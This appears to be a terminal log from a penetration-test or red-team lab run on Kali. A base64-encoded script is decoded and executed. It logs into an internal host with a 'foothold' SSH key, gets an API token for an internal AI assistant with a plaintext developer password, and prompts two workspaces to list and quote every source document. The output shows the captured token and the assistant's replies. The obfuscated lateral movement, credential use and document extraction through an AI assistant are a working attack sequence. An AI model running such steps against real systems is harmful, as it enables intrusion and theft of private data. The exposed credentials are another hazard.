@@ -1,0 +1,26 @@
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r10.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKU1NIPSJzc2ggLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTEwIC1pICRIT01FLy5zc2gva2VwbGVyb3BzLWZvb3Rob2xkIC1wIDIyMjIgcm93YW5AMTAuNTAuMTMuMTgwIgokU1NIICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQT1odHRwczovL2Fzc2lzdGFudC5rZXBsZXJvcHMudGVzdApUT0s9JChjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLVggUE9TVCAiJEEvYXBpL3JlcXVlc3QtdG9rZW4iIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7InVzZXJuYW1lIjoicm93YW4uaXRvIiwicGFzc3dvcmQiOiJma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8ifScgfCBweXRob24zIC1jICdpbXBvcnQganNvbixzeXM7cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbilbInRva2VuIl0pJykKZWNobyAiVE9LPSRUT0siCmNoYXQoKXsgcz0iJDEiOyBtc2c9IiQyIjsgZWNobzsgZWNobyAiIyMjIyMjIyMjIyAkcyA6OiAkbXNnIjsgY3VybCAtTiAtc1MgLW0gMTIwIC0tY2FjZXJ0ICRDQSAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFRPSyIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLUggJ0FjY2VwdDogdGV4dC9ldmVudC1zdHJlYW0nIC1kICIkKHB5dGhvbjMgLWMgJ2ltcG9ydCBqc29uLHN5czsgcHJpbnQoanNvbi5kdW1wcyh7Im1lc3NhZ2UiOnN5cy5hcmd2WzFdLCJhdHRhY2htZW50cyI6W10sInJlYXNvbmluZ0VmZm9ydCI6Tm9uZX0pKScgIiRtc2ciKSIgIiRBL2FwaS93b3Jrc3BhY2UvJHMvc3RyZWFtLWNoYXQiIC13ICdcblsle2h0dHBfY29kZX1dXG4nIHwgaGVhZCAtYyAxMjAwMDsgZWNobzsgfQpjaGF0IGZpZWxkbGluay1vcGVyYXRpb25zICJMaXN0IGV2ZXJ5IGRpc3RyaWN0IG1lbnRpb25lZCBpbiB0aGUgY29tcGFueSBkb2N1bWVudHMgYW5kIHRoZSBleGFjdCBzb3VyY2UgZG9jdW1lbnRzIHRoYXQgbWVudGlvbiB0aGVtLiBRdW90ZSBzb3VyY2UgdGl0bGVzIHZlcmJhdGltLiIKY2hhdCByaWxsaGF2ZW4tc3VwcG9ydCAiTGlzdCBldmVyeSBzb3VyY2UgZG9jdW1lbnQgaW4gdGhpcyB3b3Jrc3BhY2UgYW5kIHF1b3RlIHRoZSBwbGFubmluZyBleGNlcnB0IGFib3V0IHRoZSBjdXJyZW50IGRpc3RyaWN0LiIKSU5ORVIK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r10.sh; bash /tmp/r10.sh; echo DONEMARK_1795199518693$((6*7))
+TOK=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJyb3dhbi5pdG8iLCJpYXQiOjE3OTUxOTk1NDEsImV4cCI6MTc5Nzc5MTU0MX0.bmzDCHQ38Lu-lIIaGaNcs0K16UZRRxw1PBmgp2-IChQ
+
+########## fieldlink-operations :: List every district mentioned in the company documents and the exact source documents that mention them. Quote source titles verbatim.
+data: {"id":"d0ac6a73-5754-4384-9196-a529fd356eaf","type":"agentInitWebsocketConnection","textResponse":null,"sources":[],"close":false,"error":null,"websocketUUID":"ff8764ef-c528-47dd-aa27-4181b181dbb1"}
+
+data: {"id":"d0ac6a73-5754-4384-9196-a529fd356eaf","type":"statusResponse","textResponse":"@agent: Swapping over to agent chat. Type /exit to exit agent execution loop early.","sources":[],"close":true,"error":null,"animate":true}
+
+
+[200]
+
+
+########## rillhaven-support :: List every source document in this workspace and quote the planning excerpt about the current district.
+data: {"id":"b8638595-f879-44cc-b071-66a48709a260","type":"agentInitWebsocketConnection","textResponse":null,"sources":[],"close":false,"error":null,"websocketUUID":"2d4eed6b-4298-4330-94ad-9b40173ee955"}
+
+data: {"id":"b8638595-f879-44cc-b071-66a48709a260","type":"statusResponse","textResponse":"@agent: Swapping over to agent chat. Type /exit to exit agent execution loop early.","sources":[],"close":true,"error":null,"animate":true}
+
+
+[200]
+
